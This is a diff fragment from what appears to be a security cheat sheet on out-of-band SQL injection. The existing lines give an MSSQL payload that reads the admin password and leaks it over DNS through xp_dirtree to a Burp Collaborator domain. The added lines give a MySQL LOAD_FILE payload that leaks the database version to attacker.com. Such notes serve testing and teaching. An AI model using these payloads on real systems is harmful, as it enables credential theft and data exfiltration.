@@ -14,3 +14,8 @@
 * **For example**: 
 #### `'; declare @s varchar(1024);set @s=(SELECT password FROM users WHERE username='admin');exec('master..xp_dirtree"//'+@s'+.32rf2f2f829f29fh29f2hf29fh2ay.burpcollaborator.net/a"'--`
 * This input retrieves the password for the Administrator user, appends a unique Collaborator subdomain, and initiates a DNS lookup.
+
+#### Another Example:
+```sql
+LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'));
+```
